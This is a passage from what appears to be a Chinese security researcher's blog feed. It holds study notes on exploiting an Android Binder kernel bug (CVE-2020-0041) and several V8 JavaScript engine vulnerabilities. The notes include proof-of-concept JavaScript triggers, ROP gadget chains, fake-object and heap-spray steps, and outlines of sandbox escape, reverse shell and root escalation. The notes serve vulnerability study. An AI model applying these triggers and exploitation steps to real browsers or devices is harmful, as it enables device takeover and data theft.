class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (!(bp-&gt;flags &amp; BINDER_BUFFER_FLAG_HAS_PARENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    parent = binder_validate_ptr(target_proc, b, &amp;object, bp-&gt;parent,</span><br><span class="line">                    off_start_offset, &amp;parent_offset,</span><br><span class="line">                    num_valid);</span><br><span class="line"><span class="comment">//drivers/android/binder.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct binder_buffer_object *<span class="title">binder_validate_ptr</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">                        struct binder_proc *proc,</span></span></span><br><span class="line"><span class="function"><span class="params">                        struct binder_buffer *b,</span></span></span><br><span class="line"><span class="function"><span class="params">                        struct binder_object *object,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">binder_size_t</span> index,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">binder_size_t</span> start_offset,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">binder_size_t</span> *object_offsetp,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">binder_size_t</span> num_valid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (index &gt;= num_valid)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    buffer_offset = start_offset + <span class="keyword">sizeof</span>(<span class="keyword">binder_size_t</span>) * index;</span><br><span class="line">    binder_alloc_copy_from_buffer(&amp;proc-&gt;alloc, &amp;object_offset,</span><br><span class="line">                      b, buffer_offset, <span class="keyword">sizeof</span>(object_offset));</span><br><span class="line">    object_size = binder_get_object(proc, b, object_offset, object);</span><br><span class="line">    <span class="keyword">if</span> (!object_size || object-&gt;hdr.type != BINDER_TYPE_PTR)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure><p>该函数binder_validate_ptr()使用num_valid并检查两件事：</p><ul><li>如果给定索引（此处为off_start_offset）小于num_valid，则该函数仅信任已处理的对象。</li><li>binder_buffer_object在索引（off_start_offset）中找到的偏移量处是否是有效的（使用magic number检查）。</li></ul><h4 id="再看一个栗子"><a href="#再看一个栗子" class="headerlink" title="再看一个栗子"></a>再看一个栗子</h4><p>A进程想要发送hild_string给B进程，该结构包含一个属于进程A的指针；为了使该结构在接收方进程内存中有效，Binder驱动程序需要通过一个属于该内存空间的指针来对其进行更改；parent和parent_off来完成BINDER_TYPE_PTR的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// structure of BINDER_TYPE_PTR</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">binder_object_header</span> &#123;</span></span><br><span class="line">    __u32        type;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">binder_buffer_object</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_object_header</span> <span class="title">hdr</span>;</span></span><br><span class="line">    __u32 flags;</span><br><span class="line">    <span class="keyword">binder_uintptr_t</span> buffer;</span><br><span class="line">    <span class="keyword">binder_size_t</span> length;</span><br><span class="line">    <span class="keyword">binder_size_t</span> parent; <span class="comment">// Index to parent object (in offsets buffer)</span></span><br><span class="line">    <span class="keyword">binder_size_t</span> parent_offset; <span class="comment">// Offset to patch in the parent buffer</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这张图有助理解一下：</p><p><img src="带有hidl_string的Binder-parent示例.png" alt="带有hidl_string的Binder parent示例"></p><h4 id="PARENTS-FIXUP规则"><a href="#PARENTS-FIXUP规则" class="headerlink" title="PARENTS FIXUP规则"></a>PARENTS FIXUP规则</h4><p>在调用此检查之前，绑定程序内核已经检查了指向缓冲区及其大小的指针是否有效（指向调用者内存的指针），然后内核应用有如下检测规则：</p><ul><li>父索引必须小于或等于num_valid，之前的所有对象num_valid已由内核验证。</li><li>仅允许对已验证的最后一个缓冲区对象或其父对象进行修复</li><li>仅允许缓冲区内的修正在偏移增加时发生</li></ul><h3 id="利用思路-4"><a href="#利用思路-4" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="获得可用原语"><a href="#获得可用原语" class="headerlink" title="获得可用原语"></a>获得可用原语</h4><p>从背景知识大约可以看出需要在验证过程中更改父级层次结构，可以使用extra缓冲区来完成，如果binder对象的父索引指向该多余部分，则当内核在此位置复制数据时，父对象将被更改。</p><ul><li>先搞三个对象A、B、C，A是B的父对象，B的off为零，然后A也是C的父对象，off待确定，D为fakeObj；</li><li>B和C的parent index都指向extra区的offset A；</li><li>内核验证完A和B，验证C时暂停；此时Data A和Data B都已经复制到了extra区；B是last verified object；</li><li>处理C对象，复制Data C的时候正好覆盖原来的offset A为offset D（适当喷射）；此时B和C的parent为我们构造的fakeObj D；</li><li>然后parents修补，使用<code>binder_alloc_copy_to_buffer()</code>；</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Extract of binder.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">binder_fixup_parent</span><span class="params">(...)</span></span>&#123;</span><br><span class="line">    <span class="comment">// Check of rules here [...]</span></span><br><span class="line"></span><br><span class="line">    buffer_offset = bp-&gt;parent_offset +</span><br><span class="line">            (<span class="keyword">uintptr_t</span>)parent-&gt;buffer - (<span class="keyword">uintptr_t</span>)b-&gt;user_data;</span><br><span class="line">    binder_alloc_copy_to_buffer(&amp;target_proc-&gt;alloc, b, buffer_offset,</span><br><span class="line">                    &amp;bp-&gt;buffer, <span class="keyword">sizeof</span>(bp-&gt;buffer));</span><br></pre></td></tr></table></figure><p>可以看到我们有了可用原语——覆盖经过验证的Binder事务的任意部分；但是这个地方用到了<code>b-&gt;user_data</code>，不做处理会崩的；也好处理，因为Android中所有进程都fork自zygote，binder is the address of the binder buffer，在所有进程中都类似甚至一致的，直接取我们恶意进程中的值。</p><h4 id="劫持eip"><a href="#劫持eip" class="headerlink" title="劫持eip"></a>劫持eip</h4><p>看一段这个代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">status_t</span> BBinder::onTransact(</span><br><span class="line">    <span class="keyword">uint32_t</span> code, <span class="keyword">const</span> Parcel&amp; data, Parcel* reply, <span class="keyword">uint32_t</span> <span class="comment">/*flags*/</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (code) &#123;</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">        <span class="keyword">case</span> SHELL_COMMAND_TRANSACTION: &#123;</span><br><span class="line">            <span class="keyword">int</span> in = data.readFileDescriptor();</span><br><span class="line">            <span class="keyword">int</span> out = data.readFileDescriptor();</span><br><span class="line">            <span class="keyword">int</span> err = data.readFileDescriptor();</span><br><span class="line">            <span class="keyword">int</span> argc = data.readInt32();</span><br><span class="line">            Vector&lt;String16&gt; args;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argc &amp;&amp; data.dataAvail() &gt; <span class="number">0</span>; i++) &#123;</span><br><span class="line">               args.add(data.readString16());</span><br><span class="line">            &#125;</span><br><span class="line">            sp&lt;IShellCallback&gt; shellCallback = IShellCallback::asInterface(</span><br><span class="line">                    data.readStrongBinder());</span><br><span class="line">            sp&lt;IResultReceiver&gt; resultReceiver = IResultReceiver::asInterface(</span><br><span class="line">                    data.readStrongBinder());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// XXX can't add virtuals until binaries are updated.</span></span><br><span class="line">            <span class="comment">//return shellCommand(in, out, err, args, resultReceiver);</span></span><br><span class="line">            (<span class="keyword">void</span>)in;</span><br><span class="line">            (<span class="keyword">void</span>)out;</span><br><span class="line">            (<span class="keyword">void</span>)err;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (resultReceiver != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                resultReceiver-&gt;send(INVALID_OPERATION);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> NO_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">status_t</span> unflatten_binder(<span class="keyword">const</span> sp&lt;ProcessState&gt;&amp; proc,</span><br><span class="line">    <span class="keyword">const</span> Parcel&amp; in, sp&lt;IBinder&gt;* out)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> flat_binder_object* flat = in.readObject(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (flat) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (flat-&gt;hdr.type) &#123;</span><br><span class="line">            <span class="keyword">case</span> BINDER_TYPE_BINDER:</span><br><span class="line">                *out = <span class="keyword">reinterpret_cast</span>&lt;IBinder*&gt;(flat-&gt;cookie);</span><br><span class="line">                <span class="keyword">return</span> finish_unflatten_binder(<span class="literal">nullptr</span>, *flat, in);</span><br><span class="line">    <span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure><p>我们想做的是覆盖<code>IResultReceiver-&gt;cookie</code>：</p><ol><li>Finds its own binder mapping and the open binder file descriptor. These are then used to figure out the maximum transaction size we can send to the broker.</li><li>Compute user_address as binder_mapping + MAPPING_SIZE - transaction_size. This is the address at which the received transaction buffer will start, assuming that the retrieved maximum transaction size corresponds to free space at the end of the binder mapping of the browser process.</li><li>Send a transaction to pre-initialize an out-of-bounds value that will be used as an offset when we trigger the bug.</li><li>Send a SHELL_COMMAND_TRANSACTION while triggering the bug. This requires adding a few objects to the transaction in order to reach the <em>readStrongBinder</em> calls.</li></ol><ul><li>Three file descriptor objects</li><li>An argument count of zero (so no strings need to be added)</li><li>A null binder as IShellCallback</li><li>The IParentProcess handle, which the driver will convert into a binder object. It is critical to provide a handle owned by the browser process here, since otherwise the driver will translate it into a handle instead of an actual object.</li><li>A fake PTR object, not added to the transaction, which will be used after triggering the bug.</li><li>A legitimate PTR object. The preinitialized offset from step 3 should match the offset of this object within the transaction buffer.</li><li>A second PTR object whose parent field is out of bounds, and points to the pre-initialized offset added above. We use a NULL buffer here, so that no copy is performed but that the out-of-bounds parent is taken as valid.</li><li>An additional PTR with the same parent but this time with a buffer. This buffer will replace the out-of-bounds offset, making it now point to the fake PTR object instead of the validated one. Additionally, the parent fixup code will now write a pointer to an arbitrary offset from the buffer start, which we use to modify the binder field of the IParentProcess node.</li><li>A final PTR with a new buffer. The buffer will be copied and its address will be written to the cookie field by the parent fixup code. This means the buffer we just sent will now be interpreted as an IResultReceiver object by the receiving code.</li></ul><p>我五毛嘤语水平就不翻译了，有些词也不知道怎么说….</p><h4 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h4><p>我们已经完全控制了一个IResultReceiver，下面就是ROP：</p><ol><li>Use a gadget to save r7 into the utmp buffer. r7 contains a pointer to the stack when our ROP chain starts executing, so this allows us to set the stack back to a good value later on. We use the following gadget for this: str r7, [r0] ; mov r0, r4 ; add sp, #0xc ; pop {r4, r5, r6, r7, pc}.</li><li>Use mmap to allocate RWX pages at a fixed address. We use the following code from the libc system call wrappers for that: svc 0 ; pop {r4-r7} ; cmn r0, #0x1000, bx lr.</li><li>Use a few ROP gadgets to copy a first stage shellcode into RWX memory. In particular, we use str r1, [r0] ; mov r0, lr ; pop {r7, pc} to write r1 to the address pointed by r0 after popping these registers from the stack.</li><li>Pivot the stack to the RWX memory, call cacheflush on the copied shellcode and jump to it. We use a pop {lr, pc} gadget to prepare the return address for cacheflush, and a pop {r0, r1, ip, sp, pc} gadget to pivot the stack and call into cacheflush.</li></ol><p>可以看到为了减小rop链的size（大小？长度？），将shellcode复制到了RWX内存中。</p><h4 id="利用尾声"><a href="#利用尾声" class="headerlink" title="利用尾声"></a>利用尾声</h4><p>可以用shellcode反弹一个shell，然后恢复chrome使用户正常使用。</p><h4 id="Escalating-to-root"><a href="#Escalating-to-root" class="headerlink" title="Escalating to root"></a>Escalating to root</h4><ul><li>大致描述就是先通过上面类似的方法拿内存写原语；</li><li>结合double free和堆喷拿任意读原语；</li><li>关掉SELinux并拿任意内存写原语；</li><li>提权然后恢复现场。</li></ul><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><a href="https://github.com/bluefrostsecurity/CVE-2020-0041">https://github.com/bluefrostsecurity/CVE-2020-0041</a></p><h2 id="Windows内核初探"><a href="#Windows内核初探" class="headerlink" title="Windows内核初探"></a>Windows内核初探</h2><p>不探了，看了两篇水文，大致了解了一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;堆喷套路&quot;&gt;&lt;a href=&quot;#堆喷套路&quot; class=&quot;headerlink&quot; title=&quot;堆喷套路&quot;&gt;&lt;/a&gt;堆喷套路&lt;/h2&gt;&lt;p&gt;size是否可控制？content是否可控？&lt;/p&gt;
&lt;p&gt;可能存在阻塞的系统调用里面找找？文件系统、驱动这些去找找？&lt;/p
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="Kernel" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/Kernel/"/>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="Kernel" scheme="https://github.com/Cracke-S-J/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>记录我分析过的v8漏洞相关思路</title>
    <link href="https://github.com/Cracke-S-J/2020/06/13/%E8%AE%B0%E5%BD%95%E6%88%91%E5%88%86%E6%9E%90%E8%BF%87%E7%9A%84v8%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E6%80%9D%E8%B7%AF/"/>
    <id>https://github.com/Cracke-S-J/2020/06/13/%E8%AE%B0%E5%BD%95%E6%88%91%E5%88%86%E6%9E%90%E8%BF%87%E7%9A%84v8%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E6%80%9D%E8%B7%AF/</id>
    <published>2020-06-13T05:18:50.000Z</published>
    <updated>2020-06-24T04:37:14.557Z</updated>
    
    <content type="html"><![CDATA[<h2 id="StarCTF-2019-CTF-oob"><a href="#StarCTF-2019-CTF-oob" class="headerlink" title="StarCTF 2019 (*CTF) oob"></a>StarCTF 2019 (*CTF) oob</h2><p><a href="https://www.freebuf.com/vuls/203721.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/203721.html</a>，这篇文章写的非常详细。</p><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>这道题添加了array越界读写一个字节的能力。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="任意地址读写原语"><a href="#任意地址读写原语" class="headerlink" title="任意地址读写原语"></a>任意地址读写原语</h4><p>这个off by one正好是读写了相邻对象的Map，可以造成类似混淆。</p><p>Float64Array跟Object混淆可以直接实现fakeObj跟addrOf。</p><h4 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h4><p>18年后一般都是WASM获得RWX内存，但是文章也介绍了一些常规二进制漏洞利用方法。</p><ul><li>随机泄露<ul><li>在内存中搜索d8指令空间</li></ul></li><li>稳定泄露<ul><li>查看Array对象结构 –&gt; 查看对象的Map属性 –&gt; 查看Map中指定的constructor结构 –&gt; 查看code属性 –&gt;在code内存地址的固定偏移处存储了v8二进制的指令地址</li></ul></li><li>将free_hook改为system，触发gc，还可以用libc中的one_gadget</li><li>one_gadget技巧<ul><li>通过malloc_hook与realloc_hook去调整栈结构</li><li>执行libc中的one_gadget</li></ul></li></ul><h2 id="Issue-821137-V8数组越界"><a href="#Issue-821137-V8数组越界" class="headerlink" title="Issue:821137-V8数组越界"></a>Issue:821137-V8数组越界</h2><h2 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>poc调试结果是elements长度已经清零并指向空数组，Array长度并未清零。</p><p>阅读patch的时候有以下几个知识点要注意：</p><ul><li>v8内置函数使用CodeStubAssembler编写<ul><li>F_BUILTIN：创建一个函数</li><li>Label：声明将要用到的标签名，这些标签名将作为跳转的目标</li><li>BIND：绑定标签（相当于将一个代码块和一个标签名绑定，跳转时就可以使用标签名跳转到相应代码块</li><li>Branch：条件跳转指令</li><li>VARIABLE：定义一些变量</li><li>Goto：跳转</li><li>CAST：类型转换</li><li>CALLJS：调用给定的JS函数</li></ul></li><li>length_smi指生成array的长度；old_length指poc中设置的为0的长度</li></ul><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>是一个数组越界读写漏洞，直接把对象分配到越界数据可控的区域内，即可实现任意地址读写原语。</p><p>要注意poc过后直接分配是分配不上的，要触发GC。</p><h2 id="CVE-2016-5198"><a href="#CVE-2016-5198" class="headerlink" title="CVE-2016-5198"></a>CVE-2016-5198</h2><p>这个环境有、难搞，要降一下Mac OS X SDK。</p><h3 id="漏洞点分析-2"><a href="#漏洞点分析-2" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>看POC：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  n.xyz = <span class="number">0x826852f4</span>;</span><br><span class="line">  <span class="built_in">parseInt</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; ++i) &#123;</span><br><span class="line">  Ctor();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; ++i) &#123;</span><br><span class="line">  Check();</span><br><span class="line">&#125;</span><br><span class="line">Ctor();</span><br><span class="line">Check();</span><br></pre></td></tr></table></figure><p>这里又是一个JIT优化问题，执行2000遍以后，被优化成直接取偏移了，然后偏移取错了。。。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>基本是调试一下，看看它崩了是什么原因，是改哪了，然后控制对应的位置按照我们的意愿去addrOf和fakeObj就行了。</p><p>由于这个洞在16年，还没有WASM可以用，除了上面洞介绍过的传统libc用法，还可以new Function，然后去改它的code部分，也就是它的汇编指令的部分。在16年左右的时候，Function的code存的不是code结构，而是真正的汇编地址，job打印出来的是美化过的结构。</p><h2 id="CVE-2017-5070"><a href="#CVE-2017-5070" class="headerlink" title="CVE-2017-5070"></a>CVE-2017-5070</h2><h3 id="漏洞点分析-3"><a href="#漏洞点分析-3" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>确认过眼神，是一个我看不懂的漏洞点。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [[&#123;&#125;], [<span class="number">1.1</span>]];</span><br><span class="line"><span class="keyword">var</span> double_arr2 = [<span class="number">1.1</span>,<span class="number">2.2</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transition</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; array.length; i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = array[i];</span><br><span class="line">    arr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;&#125; <span class="keyword">catch</span>(e) &#123;&#125;  <span class="comment">// Prevent Crankshaft from inlining this.</span></span><br><span class="line">  <span class="keyword">if</span> (flag == <span class="number">1</span>) &#123;</span><br><span class="line">    array[<span class="number">1</span>] = double_arr2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> expected = <span class="number">6.176516726456e-312</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">Math</span>.sin(<span class="number">1</span>);</span><br><span class="line">  swap();  </span><br><span class="line">  double_arr2[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  transition();</span><br><span class="line">  double_arr2[<span class="number">1</span>] = expected;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">%DebugPrint(double_arr2);</span><br><span class="line">f();</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line">f();</span><br><span class="line"></span><br><span class="line">print (<span class="string">"111"</span>);</span><br><span class="line">print (expected === double_arr2[<span class="number">1</span>]);</span><br><span class="line">print (<span class="string">"222"</span>)</span><br></pre></td></tr></table></figure><h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>从调试poc来看是发生了类型混淆，思路还是利用类型混淆去addrOf、fakeObj。</p><h2 id="CVE-2018-17463"><a href="#CVE-2018-17463" class="headerlink" title="CVE-2018-17463"></a>CVE-2018-17463</h2><h3 id="漏洞点分析-4"><a href="#漏洞点分析-4" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_vul</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bad_create</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">        x.a;</span><br><span class="line">        <span class="built_in">Object</span>.create(x);</span><br><span class="line">        <span class="keyword">return</span> x.b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> x = &#123;<span class="attr">a</span> : <span class="number">0x1234</span>&#125;;</span><br><span class="line">        x.b = <span class="number">0x5678</span>;</span><br><span class="line">        <span class="keyword">let</span> res = bad_create(x);</span><br><span class="line">        <span class="comment">//log(res);</span></span><br><span class="line">        <span class="keyword">if</span>( res != <span class="number">0x5678</span>)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"CVE-2018-17463 exists in the d8"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"bad d8 version"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">check_vul();</span><br></pre></td></tr></table></figure><p>这个洞的知识点是，JIT优化后没了类型检查，直接取偏移，而Object.create后结构会被整理到一个hash表中，不是JIT认为的那个偏移了。</p><h3 id="利用思路-4"><a href="#利用思路-4" class="headerlink" title="利用思路"></a>利用思路</h3><p>利用主要是以下几点：</p><ul><li>要确定JIT取的偏移对应着哪块内存，调试后发现是hash表中的另某个属性。</li><li>这样就可以重叠造成类型混淆。</li><li>然后addrOf、fakeObj。</li></ul><h2 id="CVE-2019-5782"><a href="#CVE-2019-5782" class="headerlink" title="CVE-2019-5782"></a>CVE-2019-5782</h2><p>这个洞感觉已经烂大街了。</p><h3 id="漏洞点分析-5"><a href="#漏洞点分析-5" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>是计算范围的时候出现问题，具体还没<a href="http://eternalsakura13.com/2018/11/28/bug-906043/" target="_blank" rel="noopener">细看</a>。</p><h3 id="利用思路-5"><a href="#利用思路-5" class="headerlink" title="利用思路"></a>利用思路</h3><p>超长越界读写的话，任意地址读写原语就都有了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;StarCTF-2019-CTF-oob&quot;&gt;&lt;a href=&quot;#StarCTF-2019-CTF-oob&quot; class=&quot;headerlink&quot; title=&quot;StarCTF 2019 (*CTF) oob&quot;&gt;&lt;/a&gt;StarCTF 2019 (*CTF) oob
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/v8/"/>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>分析v8漏洞从入门到入门 -- Issue 1793</title>
    <link href="https://github.com/Cracke-S-J/2020/06/11/%E5%88%86%E6%9E%90v8%E6%BC%8F%E6%B4%9E%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8-Issue-1793/"/>
    <id>https://github.com/Cracke-S-J/2020/06/11/%E5%88%86%E6%9E%90v8%E6%BC%8F%E6%B4%9E%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8-Issue-1793/</id>
    <published>2020-06-11T14:11:33.000Z</published>
    <updated>2020-06-26T15:18:21.396Z</updated>
    
